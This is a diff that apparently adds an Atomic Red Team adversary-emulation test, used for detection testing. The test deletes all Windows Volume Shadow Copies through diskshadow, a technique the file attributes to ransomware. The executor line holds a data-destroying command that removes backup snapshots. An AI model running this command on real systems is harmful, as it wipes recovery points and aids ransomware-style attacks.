@@ -184,3 +184,21 @@ atomic_tests:
     cleanup_command: sudo tmutil enable
     name: sh
     elevation_required: true
+- name: Windows - Delete Volume Shadow Copies via Diskshadow
+  description: |
+    Deletes Windows Volume Shadow Copies via Diskshadow binary. This technique is used by numerous ransomware families such as Crytox. The binary is present by default in Windows Server operating systems (since Windows Server 2008). Upon execution, it will delete all shadows copies of the server.
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Create volume shadow copy of C:\ . This prereq command only works on Windows Server or Windows 8.
+    prereq_command: |
+      if(!(vssadmin.exe list shadows | findstr "No items found that satisfy the query.")) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      vssadmin.exe create shadow /for=c:
+  executor:
+    command: |
+      "delete shadows all" | diskshadow.exe
+    name: powershell
+    elevation_required: true
